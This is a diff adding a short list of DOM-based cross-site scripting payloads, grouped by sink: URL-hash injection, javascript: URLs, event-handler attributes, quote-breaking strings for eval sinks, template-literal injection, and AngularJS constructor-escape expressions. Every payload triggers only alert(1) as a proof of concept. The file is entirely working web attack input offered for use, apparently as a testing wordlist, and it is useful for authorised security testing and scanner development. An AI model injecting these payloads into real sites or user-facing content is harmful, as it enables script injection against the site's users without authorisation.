@@ -1,0 +1,27 @@
+# DOM-based XSS Payloads
+
+# Hash-based injection
+#<script>alert(1)</script>
+#<img src=x onerror=alert(1)>
+
+# Location manipulation
+javascript:alert(1)
+
+# Event handler sinks
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<div onmouseover=alert(1)>hover</div>
+
+# Eval sinks
+';alert(1)//
+");alert(1)//
+'-alert(1)-'
+"-alert(1)-"
+
+# Template literals
+${alert(1)}
+{{constructor.constructor('alert(1)')()}}
+
+# AngularJS expressions
+{{constructor.constructor('alert(1)')()}}
+{{$on.constructor('alert(1)')()}}
